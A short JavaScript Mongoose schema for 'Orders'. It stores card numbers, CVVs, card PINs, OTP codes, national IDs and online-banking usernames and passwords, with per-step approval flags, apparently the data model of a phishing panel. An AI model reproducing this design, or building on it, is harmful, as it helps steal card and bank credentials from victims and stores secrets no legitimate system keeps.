const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema({
    fullName: String,
    nationalId: String,
    email: String,
    phone: String,
    accountNumber: String,
    visaAccept: {
      type: Boolean,
      default: false,
    },
    cardNumber: String,
    expiryDate: String,
    cvv: String,
    card_name: String,
    pin: String,
    money: String,
    otpAccept: {
      type: Boolean,
      default: false,
    },
    otp: String,
    username: String,
    password: String,
    userAccept: {
      type: Boolean,
      default: false,
    },

    userOtp: String,
    userOtpAccept: {
      type: Boolean,
      default: false,
    },
    checked: {
      type: Boolean,
      default: false,
    },
  })
);
